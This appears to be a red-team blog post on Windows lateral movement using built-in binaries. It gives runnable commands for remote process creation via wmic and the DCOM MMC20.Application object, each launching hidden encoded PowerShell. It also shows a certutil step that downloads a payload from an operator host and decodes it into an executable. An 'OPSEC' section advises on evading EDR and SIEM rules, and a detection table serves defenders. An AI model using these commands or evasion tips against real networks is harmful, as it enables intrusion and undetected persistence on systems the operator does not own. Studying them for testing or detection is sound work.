---
title: "Living Off the Land: LOLBin Tradecraft for Lateral Movement"
description: "Practical techniques for lateral movement using Windows built-in binaries — bypassing AV/EDR while blending into legitimate system activity."
pubDate: 2025-10-03
tags: ["red-team", "lolbins", "lateral-movement", "windows", "opsec", "tradecraft"]
difficulty: "intermediate"
---

## Why LOLBins?

"Living Off the Land" (LotL) tradecraft relies on binaries already present on a target system — signed by Microsoft, often whitelisted by AV, and generating telemetry that blends with legitimate administrative activity. For a red team operator, the appeal is straightforward: no payload to drop, no custom signature to trip, and plausible deniability when logs are reviewed.

This post focuses on three techniques commonly used for lateral movement during an engagement: WMI via `wmic.exe`, DCOM via the `MMC20.Application` COM object, and file staging with `certutil.exe`.

---

## WMI Lateral Movement

Windows Management Instrumentation is the administrative backbone of Windows networks. Legitimate IT tooling uses it constantly, which makes attacker-generated WMI traffic noisy to baseline.

### Execution via `wmic.exe`

```cmd
wmic /node:"192.168.1.50" /user:"CORP\svcadmin" /password:"P@ssw0rd!"
     process call create "powershell -nop -w hidden -enc <base64>"
```

- Authenticates over `DCOM` (TCP 135 + dynamic RPC ports).
- Remote process spawns under `WmiPrvSE.exe` on the target.
- Returns a PID on success; no interactive shell — fire-and-forget execution.

### WMI Event Subscription (Persistence variant)

For persistence rather than single-shot execution, WMI event subscriptions (`__EventFilter` + `CommandLineEventConsumer`) survive reboots and are harder to detect than scheduled tasks, but are out of scope for this post.

---

## DCOM Lateral Movement via MMC20.Application

The `MMC20.Application` COM object exposes an `ExecuteShellCommand` method that was intended for legitimate MMC snap-in automation. It can be instantiated on a remote host using `GetTypeFromProgID` with a remote machine name.

```powershell
$com = [System.Activator]::CreateInstance(
    [System.Type]::GetTypeFromProgID("MMC20.Application", "192.168.1.50")
)
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -nop -w hidden -enc <base64>",
    "7"   # SW_SHOWMINNOACTIVE -- hidden window
)
```

Key differences from WMI:
- Spawns under `mmc.exe` rather than `WmiPrvSE.exe`.
- Uses `DCOM` activation; requires `DCOM` enabled and the caller to have activation permissions.
- Less commonly monitored than WMI in many SOC playbooks.

---

## File Staging with `certutil.exe`

`certutil.exe` is a certificate management utility that can also decode Base64-encoded files — a feature frequently abused for payload staging:

```cmd
certutil.exe -urlcache -split -f http://192.168.1.100/payload.b64 C:\Windows\Temp\p.b64
certutil.exe -decode C:\Windows\Temp\p.b64 C:\Windows\Temp\p.exe
```

`-urlcache` causes certutil to fetch and cache the URL. The file is written to disk, so this technique is not file-less — it is useful for staging a subsequent reflective loader that immediately unmaps the file from disk after reading it into memory.

---

## Detection Notes

The table below lists key detection opportunities for each technique.

| Technique | Primary Event | Key Indicator |
|---|---|---|
| WMI `wmic` remote | EID 4688 on target | `ParentImage: WmiPrvSE.exe`, `CommandLine` contains encoded payload |
| WMI `wmic` remote | EID 4624 on target | Logon Type 3, source IP matches operator |
| DCOM MMC20 | EID 4688 on target | `ParentImage: mmc.exe` spawning `cmd.exe` or `powershell.exe` |
| DCOM MMC20 | Sysmon EID 3 | Network connection from `mmc.exe` |
| certutil staging | EID 4688 | `certutil.exe` with `-urlcache` or `-decode` in CommandLine |
| certutil staging | DNS / proxy logs | Outbound request from `certutil.exe` to non-Microsoft CDN |

`WmiPrvSE.exe` as a parent process for `cmd.exe` or `powershell.exe` is a high-fidelity indicator — legitimate WMI-spawned processes are rare in most environments.

---

## OPSEC Summary

| Technique | Detection Risk | Notes |
|---|---|---|
| `wmic` remote exec | Medium | Common in mature SOCs; avoid encoded payloads in CommandLine |
| DCOM MMC20 | Low-Medium | Less commonly baselimed; noisy if DCOM not in use |
| certutil URL fetch | High | Widely signatured; many EDR products block `-urlcache` |
| certutil decode | Medium | Flagged by Defender; less flagged by legacy AV |

**Operator recommendations:**
- Prefer DCOM techniques over WMI in environments with heavy WMI monitoring.
- Replace certutil staging with `bitsadmin` or in-memory download via PowerShell `IEX` where possible.
- Always review the parent-child process chain your technique produces before executing.
- Rotate C2 listener ports away from 4444/5555/8888 — these are auto-flagged by many SIEM rules.

---

## Conclusion

LOLBin techniques remain effective because they abuse signed, trusted binaries in ways that generate telemetry indistinguishable from legitimate administrative activity without careful behavioral analysis. The best defenses are tight application allowlisting, careful baselining of WMI and DCOM usage, and process-tree anomaly detection rather than signature-based blocking.
